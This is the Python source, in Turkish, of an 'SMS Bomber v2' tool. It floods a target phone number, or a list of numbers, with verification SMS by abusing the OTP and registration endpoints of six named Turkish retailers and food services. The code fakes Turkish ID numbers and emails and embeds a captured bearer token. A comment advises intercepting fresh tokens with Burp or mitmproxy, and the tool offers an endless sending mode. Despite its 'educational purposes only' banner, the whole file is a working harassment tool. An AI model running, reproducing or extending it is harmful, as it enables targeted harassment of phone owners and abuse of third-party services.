# -*- coding: utf-8 -*-
"""
SMS Bomber v2 - Tek Dosya
Bu tool https://github.com/memetcanwq31-ship-it/MarkOs_Hack adresine aittir.
Kullanım: pip install requests colorama && python sms_bomber.py
"""

import os
import sys
import requests
from time import sleep
from random import choice, randint
from string import ascii_lowercase
from colorama import Fore, Style

# ============================================================
# BANNER
# ============================================================
BANNER = r"""
███████╗███╗   ███╗███████╗    ██████╗  ██████╗ ███╗   ███╗██████╗ ███████╗██████╗ 
██╔════╝████╗ ████║██╔════╝    ██╔══██╗██╔═══██╗████╗ ████║██╔══██╗██╔════╝██╔══██╗
███████╗██╔████╔██║███████╗    ██████╔╝██║   ██║██╔████╔██║██████╔╝█████╗  ██████╔╝
╚════██║██║╚██╔╝██║╚════██║    ██╔══██╗██║   ██║██║╚██╔╝██║██╔══██╗██╔══╝  ██╔══██╗
███████║██║ ╚═╝ ██║███████║    ██████╔╝╚██████╔╝██║ ╚═╝ ██║██████╔╝███████╗██║  ██║
╚══════╝╚═╝     ╚═╝╚══════╝    ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═════╝ ╚══════╝╚═╝  ╚═╝
"""

# Aktif servisler (yeni servis eklemek için buraya metod adını ekle)
SERVICES = ["KahveDunyasi", "Bim", "File", "Evidea", "Porty", "Dominos"]


# ============================================================
# SMS SERVİS SINIFI
# ============================================================
class SendSms:
    adet = 0  # başarılı gönderim sayacı

    def __init__(self, phone, mail=""):
        # Geçerli TC Kimlik No üret (11 hane, algoritmaya uygun)
        rakam = [randint(1, 9)] + [randint(0, 9) for _ in range(8)]
        rakam.append(((rakam[0] + rakam[2] + rakam[4] + rakam[6] + rakam[8]) * 7 -
                      (rakam[1] + rakam[3] + rakam[5] + rakam[7])) % 10)
        rakam.append(sum(rakam[:10]) % 10)
        self.tc = "".join(map(str, rakam))

        self.phone = str(phone)
        self.mail = mail if mail else ''.join(choice(ascii_lowercase) for _ in range(22)) + "@gmail.com"

    # ---------------- yardımcılar ----------------
    def _basarili(self, servis):
        self.adet += 1
        print(f"{Fore.LIGHTGREEN_EX}[√] {Style.RESET_ALL}SMS Gönderildi! {self.phone} --> {servis}")

    def _basarisiz(self, servis):
        print(f"{Fore.LIGHTRED_EX}[X] {Style.RESET_ALL}SMS Gönderilemedi! {self.phone} --> {servis}")

    # ---------------- servisler ----------------
    # kahvedunyasi.com
    def KahveDunyasi(self):
        try:
            url = "https://api.kahvedunyasi.com/api/v1/auth/account/register/phone-number"
            headers = {
                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0",
                "Accept": "application/json, text/plain, */*",
                "Content-Type": "application/json",
                "X-Language-Id": "tr-TR",
                "X-Client-Platform": "web",
                "Origin": "https://www.kahvedunyasi.com",
                "Referer": "https://www.kahvedunyasi.com/",
            }
            r = requests.post(url, headers=headers,
                              json={"countryCode": "90", "phoneNumber": self.phone},
                              timeout=6)
            if r.status_code == 200 and r.json().get("processStatus") == "Success":
                self._basarili("KahveDünyası")
            else:
                raise Exception
        except Exception:
            self._basarisiz("KahveDünyası")

    # bim.com.tr
    def Bim(self):
        try:
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                "Content-Type": "application/json",
                "Origin": "https://www.bim.com.tr",
                "Referer": "https://www.bim.com.tr/",
            }
            r = requests.post("https://bim.veesk.net/service/v1.0/account/login",
                              json={"phone": self.phone},
                              headers=headers,
                              timeout=10)
            if r.status_code == 200:
                self._basarili("BIM")
            else:
                raise Exception
        except Exception:
            self._basarisiz("BIM")

    # filemarket.com.tr
    def File(self):
        try:
            url = "https://api.filemarket.com.tr/v1/otp/send"
            headers = {
                "Accept": "*/*",
                "Content-Type": "application/json",
                "User-Agent": "filemarket/2022060120013 CFNetwork/1335.0.3.2 Darwin/21.6.0",
                "X-Os": "IOS",
                "X-Version": "1.7",
            }
            r = requests.post(url, headers=headers,
                              json={"mobilePhoneNumber": f"90{self.phone}"},
                              timeout=6)
            if r.status_code == 200 and r.json().get("responseType") == "SUCCESS":
                self._basarili("FileMarket")
            else:
                raise Exception
        except Exception:
            self._basarisiz("FileMarket")

    # evidea.com
    def Evidea(self):
        try:
            url = "https://www.evidea.com/users/register/"
            boundary = "fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi"
            headers = {
                "Content-Type": f"multipart/form-data; boundary={boundary}",
                "X-Project-Name": "undefined",
                "Accept": "application/json, text/plain, */*",
                "X-App-Type": "akinon-mobile",
                "X-Requested-With": "XMLHttpRequest",
                "Accept-Language": "tr-TR,tr;q=0.9",
                "Cache-Control": "no-store",
                "X-App-Device": "ios",
                "Referer": "https://www.evidea.com/",
                "User-Agent": "Evidea/1 CFNetwork/1335.0.3 Darwin/21.6.0",
            }
            data = (
                f"--{boundary}\r\n"
                f'content-disposition: form-data; name="first_name"\r\n\r\nMemati\r\n'
                f"--{boundary}\r\n"
                f'content-disposition: form-data; name="last_name"\r\n\r\nBas\r\n'
                f"--{boundary}\r\n"
                f'content-disposition: form-data; name="email"\r\n\r\n{self.mail}\r\n'
                f"--{boundary}\r\n"
                f'content-disposition: form-data; name="email_allowed"\r\n\r\nfalse\r\n'
                f"--{boundary}\r\n"
                f'content-disposition: form-data; name="sms_allowed"\r\n\r\ntrue\r\n'
                f"--{boundary}\r\n"
                f'content-disposition: form-data; name="password"\r\n\r\n31ABC..abc31\r\n'
                f"--{boundary}\r\n"
                f'content-disposition: form-data; name="phone"\r\n\r\n0{self.phone}\r\n'
                f"--{boundary}\r\n"
                f'content-disposition: form-data; name="confirm"\r\n\r\ntrue\r\n'
                f"--{boundary}--\r\n"
            )
            r = requests.post(url, headers=headers, data=data, timeout=6)
            if r.status_code == 202:
                self._basarili("Evidea")
            else:
                raise Exception
        except Exception:
            self._basarisiz("Evidea")

    # Porty
    def Porty(self):
        try:
            url = "https://panel.porty.tech/api.php"
            headers = {
                "User-Agent": "Porty/1 CFNetwork/1335.0.3.4",
                "Content-Type": "application/json",
            }
            r = requests.post(url, json={"job": "start_login", "phone": self.phone},
                              headers=headers, timeout=10)
            if r.status_code == 200 or "success" in r.text.lower():
                self._basarili("Porty")
            else:
                raise Exception
        except Exception:
            self._basarisiz("Porty")

    # dominos.com.tr
    def Dominos(self):
        try:
            url = "https://frontend.dominos.com.tr/api/customer/sendOtpCode"
            # DİKKAT: Bearer token zamanla geçersiz olur. Güncel token'ı
            # Dominos uygulamasından Burp/mitmproxy ile yakalayıp değiştir.
            token = "eyJhbGciOiJBMTI4S1ciLCJlbmMiOiJBMTI4Q0JDLUhTMjU2IiwidHlwIjoiSldUIn0.ITty2sZk16QOidAMYg4eRqmlBxdJhBhueRLSGgSvcN3wj4IYX11FBA.N3uXdJFQ8IAFTnxGKOotRA.7yf_jrCVfl-MDGJjxjo3M8SxVkatvrPnTBsXC5SBe30x8edSBpn1oQ5cQeHnu7p0ccgUBbfcKlYGVgeOU3sLDxj1yVLE_e2bKGyCGKoIv-1VWKRhOOpT_2NJ-BtqJVVoVnoQsN95B6OLTtJBlqYAFvnq6NiQCpZ4o1OGNhep1TNSHnlUU6CdIIKWwaHIkHl8AL1scgRHF88xiforpBVSAmVVSAUoIv8PLWmp3OWMLrl5jGln0MPAlST0OP9Q964ocXYRfAvMhEwstDTQB64cVuvVgC1D52h48eihVhqNArU6-LGK6VNriCmofXpoDRPbctYs7V4MQdldENTrmVcMVUQtZJD-5Ev1PmcYr858ClLTA7YdJ1C6okphuDasvDufxmXSeUqA50-nghH4M8ofAi6HJlpK_P0x_upqAJ6nvZG2xjmJt4Pz_J5Kx_tZu6eLoUKzZPU3k2kJ4KsqaKRfT4ATTEH0k15OtOVH7po8lNwUVuEFNnEhpaiibBckipJodTMO8AwC4eZkuhjeffmf9A.QLpMS6EUu7YQPZm1xvjuXg"
            headers = {
                "Content-Type": "application/json;charset=utf-8",
                "Accept": "application/json, text/plain, */*",
                "Authorization": f"Bearer {token}",
                "Device-Info": "Unique-Info: 2BF5C76D-0759-4763-C337-716E8B72D07B Model: iPhone 31 Plus Brand-Info: Apple Build-Number: 7.1.0 SystemVersion: 15.8",
                "Appversion": "IOS-7.1.0",
                "Accept-Language": "tr-TR,tr;q=0.9",
                "User-Agent": "Dominos/7.1.0 CFNetwork/1335.0.3.4 Darwin/21.6.0",
                "Servicetype": "CarryOut",
                "Locationcode": "undefined",
            }
            r = requests.post(url, headers=headers,
                              json={"email": self.mail, "isSure": False, "mobilePhone": self.phone},
                              timeout=6)
            if r.status_code == 200 and r.json().get("isSuccess") is True:
                self._basarili("Dominos")
            else:
                raise Exception
        except Exception:
            self._basarisiz("Dominos")


# ============================================================
# YARDIMCI FONKSİYONLAR
# ============================================================
def cls():
    os.system("cls" if os.name == "nt" else "clear")


def hata(mesaj):
    cls()
    print(Fore.LIGHTRED_EX + mesaj + Style.RESET_ALL)
    sleep(2)


def giris_ekrani():
    cls()
    print(Fore.LIGHTGREEN_EX + BANNER + Style.RESET_ALL)
    print()
    print(
        f"{Fore.LIGHTGREEN_EX}UYARI: Tamamen Eğitim Amaçlıdır.{Style.RESET_ALL}    "
        f"{Fore.LIGHTBLUE_EX}Geliştirici: {Style.RESET_ALL}MarkOs    "
        f"{Fore.LIGHTRED_EX}Güncel Sürüm:{Style.RESET_ALL} SMS Bomber v2"
    )
    print()


def gonder():
    cls()

    # --- Hedef numara veya dosya ---
    print(Fore.LIGHTWHITE_EX + "Hedef numara (başında '0' olmadan) veya dosya için boş bırakıp Enter: "
          + Fore.LIGHTGREEN_EX, end="")
    tel_no = input().strip()

    tel_liste = []
    if tel_no == "":
        print(Fore.LIGHTWHITE_EX + "Numara listesi dosyası (her satırda 10 haneli numara): "
              + Fore.LIGHTGREEN_EX, end="")
        dosya = input().strip()
        try:
            with open(dosya, "r", encoding="utf-8") as f:
                for satir in f.read().strip().splitlines():
                    satir = satir.strip()
                    if len(satir) == 10 and satir.isdigit():
                        tel_liste.append(satir)
        except FileNotFoundError:
            hata("Dosya bulunamadı!")
            return
        if not tel_liste:
            hata("Dosyada geçerli numara bulunamadı!")
            return
    else:
        if not (len(tel_no) == 10 and tel_no.isdigit()):
            hata("Geçersiz telefon numarası! (10 haneli olmalı)")
            return
        tel_liste.append(tel_no)

    # --- Opsiyonel e-posta ---
    print(Fore.LIGHTWHITE_EX + "Kayıt e-postası (boş bırakırsan rastgele üretilir): "
          + Fore.LIGHTGREEN_EX, end="")
    mail = input().strip()
    if mail and "@" not in mail:
        hata("Geçersiz e-posta adresi!")
        return

    # --- Adet ---
    print(Fore.LIGHTWHITE_EX + "Kaç SMS gönderilsin? (sonsuz için boş bırakıp Enter): "
          + Fore.LIGHTGREEN_EX, end="")
    kere_str = input().strip()
    try:
        kere = int(kere_str) if kere_str else None
    except ValueError:
        hata("Hatalı işlem! Sayı girmelisin.")
        return

    # --- Aralık ---
    try:
        aralik = int(input(Fore.LIGHTWHITE_EX + "SMS'ler arası saniye (0 = aralıksız): "
                           + Fore.LIGHTGREEN_EX))
    except ValueError:
        hata("Hatalı işlem! Sayı girmelisin.")
        return

    cls()
    print(Fore.LIGHTYELLOW_EX + "Gönderim başladı... (durdurmak için Ctrl+C)" + Style.RESET_ALL)
    print()

    try:
        if kere is None:
            # --- Sonsuz mod ---
            while True:
                for tel in tel_liste:
                    sms = SendSms(tel, mail)
                    for servis in SERVICES:
                        getattr(sms, servis)()
                        sleep(aralik)
        else:
            # --- Adetli mod ---
            for tel in tel_liste:
                sms = SendSms(tel, mail)
                gonderilen = 0
                while gonderilen < kere:
                    for servis in SERVICES:
                        if gonderilen >= kere:
                            break
                        getattr(sms, servis)()
                        gonderilen += 1
                        sleep(aralik)
    except KeyboardInterrupt:
        print(Fore.LIGHTRED_EX + "\nGönderim durduruldu." + Style.RESET_ALL)

    input(Fore.LIGHTRED_EX + "\nAna ekrana dönmek için 'Enter' tuşuna bas" + Style.RESET_ALL)


# ============================================================
# ANA PROGRAM
# ============================================================
def main():
    giris_ekrani()

    # Geri sayım (istersen bu bloğu sil)
    for i in range(5, 0, -1):
        print(Fore.LIGHTGREEN_EX + f"\rBaşlıyor: {i} saniye ", end="")
        sleep(1)
    print("\n")

    while True:
        giris_ekrani()
        try:
            menu = input(Fore.LIGHTWHITE_EX + " 1- SMS Gönder\n\n 2- Çıkış\n\n"
                         + Fore.LIGHTGREEN_EX + " Seçim: ")
            if menu == "":
                continue
            menu = int(menu)
        except ValueError:
            hata("Hatalı işlem! Lütfen tekrar dene.")
            continue

        if menu == 1:
            gonder()
        elif menu == 2:
            cls()
            print(Fore.LIGHTRED_EX + "Çıkış yapılıyor..." + Style.RESET_ALL)
            break
        else:
            hata("Geçersiz seçim!")


if __name__ == "__main__":
    main()
